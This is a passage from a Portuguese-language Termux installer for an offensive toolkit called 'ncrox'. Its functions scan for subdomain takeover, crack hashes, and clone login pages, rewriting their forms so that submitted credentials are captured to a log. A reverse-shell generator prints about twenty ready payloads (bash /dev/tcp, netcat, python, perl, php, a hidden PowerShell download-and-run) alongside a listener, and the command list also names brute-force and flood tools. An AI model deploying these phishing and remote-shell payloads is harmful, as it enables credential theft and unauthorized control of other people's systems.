netlify.app|Not Found - Request ID
azurewebsites.net|404 Web Site not found
cloudapp.azure.com|404 Web Site not found
trafficmanager.net|404 Web Site not found
shopify.com|Sorry, this shop is currently unavailable
myshopify.com|Sorry, this shop is currently unavailable
ghost.io|Domain error
surge.sh|project not found
bitbucket.io|Repository not found
readme.io|Project doesnt exist
zendesk.com|Help Center Closed
statuspage.io|Page Not Found
pantheonsite.io|404 error unknown site
fastly.net|Fastly error: unknown domain
desk.com|Sorry, this page is no longer available
wordpress.com|doesn't exist
F
}
ncx_takeover(){
  local dom="" wl="" thr=20 n=0 w f fps
  while [ $# -gt 0 ]; do case "$1" in
    -w) wl="$2"; shift 2;; -t) thr="$2"; shift 2;;
    -h|--help) echo "uso: ncx-takeover <dominio> [-w lista] [-t threads]"; return 0;;
    *) dom="$1"; shift;; esac; done
  [ -z "$dom" ] && { echo "uso: ncx-takeover <dominio> [-w lista]"; return 1; }
  _tag "ncx-takeover :: $dom"
  _tk_one(){
    local sub="$1" dom="$2" fps="$3" fqdn="$sub.$dom" cn svc sig body
    cn=$(dig +short CNAME "$fqdn" 2>/dev/null | head -1)
    [ -z "$cn" ] && return 0
    while IFS='|' read -r svc sig; do
      case "$cn" in *"$svc"*)
        body=$(curl -sL -m 10 -A 'Mozilla/5.0' "http://$fqdn" 2>/dev/null
               curl -sL -m 10 -A 'Mozilla/5.0' "https://$fqdn" 2>/dev/null)
        if printf '%s' "$body" | grep -qF -- "$sig"; then
          printf '%s[VULN]%s %s -> %s  (%s)\n' "$RD" "$R" "$fqdn" "$cn" "$svc"
        else
          printf '%s[SUSP]%s %s -> %s  (%s)\n' "$Y" "$R" "$fqdn" "$cn" "$svc"
        fi
        return 0 ;;
      esac
    done <<< "$fps"
  }
  fps=$(_tk_fp)
  { if [ -n "$wl" ]; then f=$(_wl_path "$wl") && _wl_read "$f" || _def_sub; else
      if f=$(_wl_path dns5000); then _wl_read "$f"; else _def_sub; fi; fi; } | while read -r w; do
    [ -z "$w" ] && continue
    _tk_one "$w" "$dom" "$fps" &
    n=$((n+1)); if [ "$n" -ge "$thr" ]; then wait -n 2>/dev/null; n=$((n-1)); fi
  done
  wait 2>/dev/null; _hr
}
ncx_crack(){
  local h="" wl="" rules="cdsl" thr=0 f
  while [ $# -gt 0 ]; do case "$1" in
    -w) wl="$2"; shift 2;; -r) rules="$2"; shift 2;; -t) thr="$2"; shift 2;;
    -h|--help) echo "uso: ncx-crack <hash> [-w lista] [-r cdsl] [-t procs]"; return 0;;
    *) h="$1"; shift;; esac; done
  [ -z "$h" ] && { echo "uso: ncx-crack <hash> [-w lista]"; return 1; }
  _tag "ncx-crack :: ${h:0:24}…"
  if [ -n "$wl" ]; then
    f=$(_wl_path "$wl") || { echo "lista não encontrada: $wl"; return 1; }
    _wl_read "$f" | python3 "$TOOLS/crack.py" "$h" -r "$rules" -t "$thr"
  else
    if f=$(_wl_path 10k); then _wl_read "$f"; else _def_pass; fi \
      | python3 "$TOOLS/crack.py" "$h" -r "$rules" -t "$thr"
  fi
  _hr
}
ncx_phish(){
  local port="" url="" title="Acesso restrito" dest="" tpl="" ip
  while [ $# -gt 0 ]; do case "$1" in
    -t) title="$2"; shift 2;; -d) dest="$2"; shift 2;; -r) tpl="$2"; shift 2;;
    -h|--help) echo "uso: ncx-phish <porta> [url_alvo] [-t titulo] [-d destino] [-r template]"; return 0;;
    *) if [ -z "$port" ]; then port="$1"; else url="$1"; fi; shift;; esac; done
  [ -z "$port" ] && { echo "uso: ncx-phish <porta> [url_alvo]"; return 1; }
  local dir="$HACK_DIR/phish"; mkdir -p "$dir"
  local page="$dir/page.html" log="$dir/capturas.log"
  : > "$page"
  _tag "ncx-phish :: :$port${url:+ :: $url}"
  if [ -n "$tpl" ] && [ -f "$tpl" ]; then
    cp "$tpl" "$page"; echo "  template: $tpl"
  elif [ -n "$url" ]; then
    if curl -fsSL -m 20 -A 'Mozilla/5.0 (Linux; Android 13)' "$url" -o "$page"; then
      sed -i -E 's/action="[^"]*"/action="\/"/Ig; s/(<form[^>]*)method="[^"]*"/\1method="POST"/Ig' "$page"
      grep -qi '<form' "$page" || printf '  %s[!]%s sem <form> — ajuste com -r\n' "$RD" "$R"
      [ -z "$dest" ] && dest="$url"
      echo "  página clonada ($(stat -c%s "$page") bytes)"
    else
      : > "$page"; printf '  %s[!]%s download falhou — template embutido\n' "$RD" "$R"
    fi
  fi
  ip=$(_myip)
  echo "  login:  http://${ip:-SEU_IP}:$port"
  echo "  painel: http://${ip:-SEU_IP}:$port/_capturas"
  echo "  log:    $log"
  [ -n "$dest" ] && echo "  redireciona: $dest"
  _hr
  PHISH_TITLE="$title" python3 "$TOOLS/phish.py" "$port" "$page" "$dest" "$log"
}

# ---------- reverse shell ----------
_myip(){
  local i
  i=$(ip route get 1.1.1.1 2>/dev/null | awk '{print $7; exit}')
  [ -z "$i" ] && i=$(ifconfig 2>/dev/null | grep -oE 'inet [0-9.]+' | awk '{print $2}' | grep -v '^127\.' | head -1)
  printf '%s' "${i:-}"
}
_listen(){
  local port="$1" wrap=""
  command -v rlwrap >/dev/null 2>&1 && wrap="rlwrap -cAr "
  _tag "listener :: 0.0.0.0:$port"
  if command -v ncat >/dev/null 2>&1; then exec ${wrap}ncat -lvnp "$port"
  elif nc -h 2>&1 | grep -q -- '-p'; then exec ${wrap}nc -lvnp "$port"
  elif command -v nc >/dev/null 2>&1; then exec ${wrap}nc -l -p "$port"
  else echo "pkg install netcat-openbsd"; fi
}
ncx_listen(){ [ -z "${1:-}" ] && { echo "uso: ncx-listen <porta>"; return 1; }; _listen "$1"; }
_p(){
  local n="$1" pl="$2"
  [ -n "$ONLY" ] && [ "$ONLY" != "$n" ] && return 0
  [ "$URLENC" = 1 ] && pl=$(python3 -c 'import sys,urllib.parse;print(urllib.parse.quote(sys.argv[1]))' "$pl")
  [ "$B64" = 1 ] && pl=$(printf '%s' "$pl" | base64 -w0)
  printf '%s[%s]%s\n%s\n\n' "$O" "$n" "$R" "$pl"
  EMIT=$((EMIT+1))
}
ncx_rev(){
  local lhost="" lport="" det=0 LISTEN=0
  ONLY=""; URLENC=0; B64=0; EMIT=0
  while [ $# -gt 0 ]; do case "$1" in
    -t) ONLY="$2"; shift 2;; -a) ONLY=""; shift;; -u) URLENC=1; shift;;
    -b) B64=1; shift;; -i) det=1; shift;; -l) LISTEN=1; shift;;
    -h|--help) echo "uso: ncx-rev <lhost|-> <lport> [-t tipo] [-u] [-b] [-i] [-l]"; \
      echo "tipos: bash sh bash196 nc nc-mkfifo ncat socat python3 python2 perl php ruby node awk telnet xterm lua java powershell powershell-b64 golang"; return 0;;
    *) if [ -z "$lhost" ]; then lhost="$1"; else lport="$1"; fi; shift;; esac; done
  [ -z "$lport" ] && { echo "uso: ncx-rev <lhost|-> <lport> [-t tipo]"; return 1; }
  case "$lport" in ''|*[!0-9]*) echo "porta inválida"; return 1;; esac
  if [ "$lport" -lt 1 ] || [ "$lport" -gt 65535 ]; then echo "porta fora de 1-65535"; return 1; fi
  [ "$lhost" = "-" ] && det=1
  [ "$det" = 1 ] && lhost=$(_myip)
  [ -z "$lhost" ] && { echo "informe o IP"; return 1; }
  _tag "ncx-rev :: $lhost:$lport"
  _p bash "bash -i >& /dev/tcp/$lhost/$lport 0>&1"
  _p sh "sh -i >& /dev/tcp/$lhost/$lport 0>&1"
  _p bash196 "0<&196;exec 196<>/dev/tcp/$lhost/$lport; sh <&196 >&196 2>&196"
  _p nc "nc $lhost $lport -e /bin/sh"
  _p nc-mkfifo "rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc $lhost $lport > /tmp/f"
  _p ncat "ncat $lhost $lport -e /bin/bash --ssl"
  _p socat "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$lhost:$lport"
  _p python3 "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"$lhost\",$lport));[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call([\"/bin/sh\",\"-i\"])'"
  _p python2 "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$lhost\",$lport));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"])'"
  _p perl "perl -e 'use Socket;\$i=\"$lhost\";\$p=$lport;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
  _p php "php -r '\$s=fsockopen(\"$lhost\",$lport);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
  _p ruby "ruby -rsocket -e 'f=TCPSocket.open(\"$lhost\",$lport).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
  _p node "node -e \"var n=require('net'),c=require('child_process'),s=c.spawn('sh',[],{stdio:['pipe','pipe','pipe']}),k=new n.Socket();k.connect($lport,'$lhost',()=>{k.pipe(s.stdin);s.stdout.pipe(k);s.stderr.pipe(k)})\""
  _p awk "awk 'BEGIN{s=\"/inet/tcp/0/$lhost/$lport\";while(1){do{s|getline l;printf \"%s\\n\",l|s}while(l!=\"exit\");close(s)}}'"
  _p telnet "telnet $lhost $lport | /bin/sh | telnet $lhost $lport"
  _p xterm "xterm -display $lhost:1"
  _p lua "lua -e \"require('socket');local s=require('socket').tcp();s:connect('$lhost',$lport);os.execute('/bin/sh -i <&'..s:getfd()..' >&'..s:getfd()..' 2>&'..s:getfd())\""
  _p java "Runtime r=Runtime.getRuntime();Process p=r.exec(new String[]{\"bash\",\"-c\",\"bash -i >& /dev/tcp/$lhost/$lport 0>&1\"});p.waitFor();"
  _p powershell "powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"\\\$c=New-Object Net.Sockets.TCPClient('$lhost',$lport);\\\$s=\\\$c.GetStream();[byte[]]\\\$b=0..65535|%{0};while((\\\$i=\\\$s.Read(\\\$b,0,\\\$b.Length)) -ne 0){;\\\$d=(New-Object Text.ASCIIEncoding).GetString(\\\$b,0,\\\$i);\\\$o=(iex \\\$d 2>&1|Out-String);\\\$s.Write(([Text.Encoding]::ASCII).GetBytes(\\\$o),0,\\\$o.Length)}\""
  _p powershell-b64 "powershell -NoP -NonI -W Hidden -Exec Bypass -Enc $(printf "IEX (New-Object Net.WebClient).DownloadString('http://%s/rev.ps1')" "$lhost" | iconv -t UTF-16LE | base64 -w0)"
  _p golang "echo 'package main;import(\"os\";\"net\");func main(){c,_:=net.Dial(\"tcp\",\"$lhost:$lport\");go func(){b:=make([]byte,1024);for{n,_:=c.Read(b);os.Stdout.Write(b[:n])}}();b:=make([]byte,1024);for{n,_:=os.Stdin.Read(b);c.Write(b[:n])}}' > /tmp/r.go && go run /tmp/r.go"
  [ "$EMIT" = 0 ] && { printf '%s[!]%s tipo desconhecido: %s\n' "$RD" "$R" "$ONLY"; return 1; }
  printf '%slistener:%s ncx-listen %s%s\n' "$D" "$R" "$lport" "$R"
  if [ "$LISTEN" = 1 ]; then _hr; _listen "$lport"; fi
}

# ---------- utilitários ----------
ncx_hash(){ [ -f "${1:-}" ] && sha256sum "$1" || echo "uso: hash <arquivo>"; }
ncx_base64(){ case "${1:-}" in enc) printf '%s' "${2:-}" | base64 -w0; echo;; dec) printf '%s' "${2:-}" | base64 -d; echo;; *) echo "uso: base64 enc|dec <texto>";; esac; }
ncx_urlinfo(){ [ -z "${1:-}" ] && return 1; python3 -c "import sys,urllib.parse as u;p=u.urlparse(sys.argv[1]);[print(f'{k:8}: {v}') for k,v in [('esquema',p.scheme),('host',p.netloc),('caminho',p.path),('query',p.query)]]" "$1" 2>/dev/null; }
ncx_jsoncheck(){ python3 -c "import json,sys;json.load(open(sys.argv[1],encoding='utf-8'));print('JSON válido')" "${1:-}" 2>/dev/null || echo "JSON inválido"; }
ncx_comparar(){ sha256sum "${1:-}" "${2:-}" 2>/dev/null | awk '{print $1}' | uniq -c | awk '{print ($1==2)?"iguais":"diferentes"}'; }
ncx_fileinfo(){ [ -e "${1:-}" ] && ls -l --time-style=long-iso "$1" && file "$1" 2>/dev/null || echo "não existe"; }
ncx_uuid(){ cat /proc/sys/kernel/random/uuid; }
ncx_netcheck(){ timeout 3 bash -c "exec 3<>/dev/tcp/${1:-}/${2:-80}" 2>/dev/null && echo "aberta" || echo "fechada/timeout"; }
ncx_sysinfo(){ echo "sistema: $(uname -srm)"; echo "host: $(uname -n)"; echo "shell: $BASH_VERSION"; echo "pwd: $PWD"; }
ncx_disk(){ df -h "${1:-$HOME}"; }
ncx_which(){ command -v "$@" 2>/dev/null || echo "não encontrado"; }
ncx_where(){ for x in "$@"; do printf '%s: %s\n' "$x" "$(command -v "$x" || echo '-')"; done; }
ncx_findtext(){ [ $# -lt 2 ] && return 1; grep -nF -- "$1" "$2" | head -1000; }
ncx_rede(){ python3 -c "import ipaddress,sys;n=ipaddress.ip_network(sys.argv[1],strict=False);print('rede:',n.network_address,'/ máscara:',n.netmask,'/ hosts:',max(n.num_addresses-2,0))" "${1:-}" 2>/dev/null; }
ncx_tree(){ find "${1:-.}" -maxdepth 3 -printf '%p\n' 2>/dev/null | head -300; }
ncx_readmd(){ [ -f "${1:-}" ] && sed 's/[*_`#]//g' "$1" | head -200; }
ncx_device(){ echo "modelo: $(getprop ro.product.model)"; echo "android: $(getprop ro.build.version.release)"; echo "abi: $(getprop ro.product.cpu.abi)"; }
ncx_battery(){ dumpsys battery 2>/dev/null | grep -E 'level|status|temperature' | sed 's/^ *//'; }
ncx_storage(){ df -h /data 2>/dev/null | tail -1; }
ncx_screen(){ wm size 2>/dev/null; wm density 2>/dev/null; }
ncx_uptime(){ awk '{printf "%.0f min\n", $1/60}' /proc/uptime; }
ncx_locale(){ getprop persist.sys.locale; }
ncx_timezone(){ date +%Z; }
ncx_volume(){ command -v termux-volume >/dev/null && termux-volume || echo "requer termux-api"; }
ncx_ringer(){ settings get global ringer_mode 2>/dev/null || echo "indisponível"; }
ncx_say(){ termux-tts-speak "${*:-}" 2>/dev/null || echo "requer termux-api"; }
ncx_open(){ termux-open "$1" 2>/dev/null || am start -a android.intent.action.VIEW -d "$1" 2>/dev/null || echo "$1"; }
ncx_pack(){ case "${1:-search}" in search) pkg search "${2:-}";; show) pkg show "${2:-}";; *) pkg "${@}";; esac; }
ncx_docs(){ find "$HOME/storage/shared" -maxdepth 4 -iname "*.${1:-pdf}" 2>/dev/null | head -100; }
ncx_applist(){ pm list packages -3 2>/dev/null | sed 's/package://' | head -200; }
ncx_tasklist(){ ps -A -o pid,comm 2>/dev/null | head -60; }
ncx_settings(){ echo "tema: ncrox"; echo "wordlists: $WL_DIR"; echo "nhack: $HACK_DIR"; echo "tools: $TOOLS"; }

ncx_dispatch(){
  local c="${1:-help}"; shift 2>/dev/null
  case "$c" in
    help|ajuda) ncx_help;;
    vigia) ncx_vigia "$@";; oraculo) ncx_oraculo "$@";; bastiao) ncx_bastiao "$@";; selo) ncx_selo "$@";;
    search) ncx_search "$@";; web) ncx_web "$@";; dns) ncx_dns "$@";; whois) ncx_whois "$@";;
    net|ip) ncx_net "$@";; github) ncx_github "$@";; ondeuto) ncx_ondeuto "$@";;
    hack|nhack) ncx_nhack "$@";; htx) ncx_htx "$@";; reap) ncx_reap "$@";; oz) ncx_oz "$@";;
    port|ncx-port) ncx_port "$@";; dir|ncx-dir) ncx_dir "$@";;
    brute|ncx-brute) ncx_brute "$@";; flood|ncx-flood) ncx_flood "$@";; sub|ncx-sub) ncx_sub "$@";;
    takeover|ncx-takeover) ncx_takeover "$@";; crack|ncx-crack) ncx_crack "$@";; phish|ncx-phish) ncx_phish "$@";;
    rev|ncx-rev) ncx_rev "$@";; listen|ncx-listen) ncx_listen "$@";;
    wl|wordlists|ncx-wordlists) ncx_wordlists "$@";;
    hash) ncx_hash "$@";; base64) ncx_base64 "$@";; urlinfo) ncx_urlinfo "$@";; jsoncheck) ncx_jsoncheck "$@";;
    comparar) ncx_comparar "$@";; fileinfo) ncx_fileinfo "$@";; uuid) ncx_uuid;; netcheck) ncx_netcheck "$@";;
    sysinfo) ncx_sysinfo;; disk) ncx_disk "$@";; which) ncx_which "$@";; where) ncx_where "$@";;
    findtext) ncx_findtext "$@";; rede) ncx_rede "$@";; tree) ncx_tree "$@";; readmd) ncx_readmd "$@";;
    device) ncx_device;; battery) ncx_battery;; storage) ncx_storage;; screen) ncx_screen;; uptime) ncx_uptime;;
    locale) ncx_locale;; timezone) ncx_timezone;; volume) ncx_volume;; ringer) ncx_ringer;; say) ncx_say "$@";;
    open) ncx_open "$@";; pack|pkg) ncx_pack "$@";; docs) ncx_docs "$@";; applist) ncx_applist;;
    tasklist) ncx_tasklist;; settings) ncx_settings;;
    *) if command -v "$c" >/dev/null 2>&1; then "$c" "$@"; else printf 'desconhecido: %s\n' "$c"; ncx_help; fi;;
  esac
}
LIBEOF
  chmod +x "$LIB"
  printf '%s[+]%s biblioteca instalada\n' "$G" "$R"
}

write_bins() {
  mkdir -p "$BIN"
  cat > "$BIN/ncrox" <<'EOF'
#!/usr/bin/env bash
export NCROX_HOME="$HOME/.ncrox"
source "$NCROX_HOME/lib/ncrox_lib.sh"
case "${1:-}" in
  ""|-i|--interactive)
    ncx_banner
    if [ -f "$NCROX_HOME/src/satanachia.py" ] && command -v python3 >/dev/null 2>&1; then
      printf '%smodo nativo. "exit" encerra.%s\n\n' "$D" "$R"
      cd "$NCROX_HOME/src" && exec python3 satanachia.py
    else
      printf '%smodo réplica%s\n\n' "$D" "$R"; ncx_help
    fi ;;
  for)
    shift; case "${1:-hack}" in hack) shift;; esac
    ncx_dispatch nhack "$@" ;;
  -r|--replica) ncx_banner; ncx_help ;;
  -update) exec ncrox-update ;;
  -restore) exec ncrox-restore ;;
  *) ncx_dispatch "$@" ;;
esac
EOF
  cat > "$BIN/ncrox-update" <<'EOF'
#!/usr/bin/env bash
[ -d "$HOME/.ncrox/src/.git" ] || { echo "sem fonte clonada"; exit 1; }
git -C "$HOME/.ncrox/src" pull --ff-only && echo "atualizado"
EOF
  cat > "$BIN/ncrox-restore" <<'EOF'
#!/usr/bin/env bash
PREFIX="${PREFIX:-/data/data/com.termux/files/usr}"
H="$HOME/.ncrox"
for f in "$H/backup/.bashrc" "$H/backup/colors.properties" "$H/backup/termux.properties" "$H/backup/motd"; do
  [ -f "$f" ] || continue
  case "$f" in
    */.bashrc) cp "$f" "$HOME/.bashrc" ;;
    *colors.properties|*termux.properties) cp "$f" "$HOME/.termux/$(basename "$f")" ;;
    *motd) cp "$f" "$PREFIX/etc/motd" ;;
  esac
done
sed -i "/# >>> ncrox prompt >>>/,/# <<< ncrox prompt <<</d" "$HOME/.bashrc" 2>/dev/null
rm -f "$PREFIX/bin/ncrox" "$PREFIX/bin/ncrox-update" "$PREFIX/bin/ncrox-restore" \
      "$PREFIX/bin/ncx-"* "$PREFIX/bin/nhack"
termux-reload-settings 2>/dev/null
echo "removido do shell. ~/.ncrox preservado"
EOF
  local t
  for t in port dir brute flood sub rev listen wordlists takeover crack phish htx reap oz; do
    cat > "$BIN/ncx-$t" <<EOF
#!/usr/bin/env bash
source "\$HOME/.ncrox/lib/ncrox_lib.sh"
ncx_$t "\$@"
EOF
  done
  cat > "$BIN/nhack" <<'EOF'
#!/usr/bin/env bash
source "$HOME/.ncrox/lib/ncrox_lib.sh"
ncx_nhack "$@"
EOF
  chmod +x "$BIN"/ncrox "$BIN"/ncrox-update "$BIN"/ncrox-restore "$BIN"/ncx-* "$BIN"/nhack
  printf '%s[+]%s launchers em %s\n' "$G" "$R" "$BIN"
}

write_prompt() {
  mkdir -p "$BK"; [ -f "$HOME/.bashrc" ] && cp "$HOME/.bashrc" "$BK/.bashrc"
  sed -i "/# >>> ncrox prompt >>>/,/# <<< ncrox prompt <<</d" "$HOME/.bashrc" 2>/dev/null
  cat >> "$HOME/.bashrc" <<'EOF'

# >>> ncrox prompt >>>
export NCROX_HOME="$HOME/.ncrox"
PS1='\[\e[38;2;255;122;0m\]┌─[\[\e[38;2;30;144;255m\]satanachia\[\e[38;2;255;122;0m\]]─[\[\e[38;2;30;144;255m\]\w\[\e[38;2;255;122;0m\]]\n└─\[\e[38;2;30;144;255m\]λ\[\e[0m\] '
PROMPT_COMMAND='printf "\033]0;satanachia :: %s\007" "${PWD##*/}"'
# <<< ncrox prompt <<<
EOF
  printf '%s[+]%s prompt aplicado\n' "$G" "$R"
}

write_motd() {
  [ -f "$PREFIX/etc/motd" ] && cp "$PREFIX/etc/motd" "$BK/motd"
  {
    printf '\n%s%s%s\n' "$O" "$ART" "$R"
    printf '%s   s a t a n a c h i a  ·  n c r o x  ·  t e r m u x%s\n' "$B" "$R"
    printf '%s   ──────────────────────────────────────────────%s\n' "$D" "$R"
    printf '%s   %s@%s  ·  %s%s\n' "$D" "$(whoami)" "$(uname -n)" "$(date '+%d/%m %H:%M')" "$R"
    printf '%s   ncrox help          comandos%s\n' "$D" "$R"
    printf '%s   ncrox for hack      arsenal nhack%s\n' "$D" "$R"
    printf '%s   ncx-port · ncx-dir · ncx-brute · ncx-flood%s\n' "$D" "$R"
    printf '%s   ncx-htx · ncx-reap · ncx-oz%s\n' "$D" "$R"
    printf '%s   ──────────────────────────────────────────────%s\n\n' "$D" "$R"
  } > "$PREFIX/etc/motd"
  printf '%s[+]%s tela de entrada reescrita\n' "$G" "$R"
}

write_colors() {
  mkdir -p "$HOME/.termux"
  [ -f "$HOME/.termux/colors.properties" ] && cp "$HOME/.termux/colors.properties" "$BK/colors.properties"
  cat > "$HOME/.termux/colors.properties" <<'EOF'
background=#08080C
foreground=#D7DCE5
cursor=#FF7A00
color0=#08080C
color1=#FF4D4D
color2=#3DDC84
color3=#FF7A00
color4=#1E90FF
color5=#B388FF
color6=#29B6F6
color7=#C7CCD6
color8=#5A5F6B
color9=#FF6B6B
color10=#69F0AE
color11=#FFA040
color12=#64B5F6
color13=#CE93D8
color14=#4DD0E1
color15=#FFFFFF
EOF
  printf '%s[+]%s paleta aplicada\n' "$G" "$R"
}

write_keys() {
  [ -f "$HOME/.termux/termux.properties" ] && cp "$HOME/.termux/termux.properties" "$BK/termux.properties"
  if ! grep -q '^extra-keys' "$HOME/.termux/termux.properties" 2>/dev/null; then
    printf '\nextra-keys = [[\x27ESC\x27,\x27/\x27,\x27-\x27,\x27HOME\x27,\x27UP\x27,\x27END\x27,\x27PGUP\x27],[\x27TAB\x27,\x27CTRL\x27,\x27ALT\x27,\x27LEFT\x27,\x27DOWN\x27,\x27RIGHT\x27,\x27PGDN\x27]]\n' \
      >> "$HOME/.termux/termux.properties"
  fi
  printf '%s[+]%s teclas configuradas\n' "$G" "$R"
}

install() {
  need_termux
  banner
  mkdir -p "$NCROX_HOME" "$BK" "$TOOLS" "$RBIN" "$TMPD" "$HACK_DIR"
  deps
  fetch_ncrox
  write_hacktools
  write_lib
  write_bins
  write_prompt
  write_motd
  write_colors
  write_keys
  printf '\n%s[*]%s wordlists base...\n' "$B" "$R"
  source "$LIB"; ncx_wordlists auto
  termux-reload-settings 2>/dev/null || true
  printf '\n%s[+] concluído%s\n' "$G" "$R"
  printf '%s    exec bash -l%s\n\n' "$D" "$R"
  printf '%s    ncrox help | ncx-htx -h | ncx-reap -l | ncx-oz --help%s\n\n' "$D" "$R"
  printf '%s    reaper compila no primeiro uso (pkg install golang)%s\n\n' "$D" "$R"
}

case "${1:-install}" in
  install|"") install ;;
  update) exec "$BIN/ncrox-update" ;;
  restore) exec "$BIN/ncrox-restore" ;;
  banner) banner ;;
  *) echo "uso: bash ncrox.sh [install|update|restore|banner]" ;;
esac
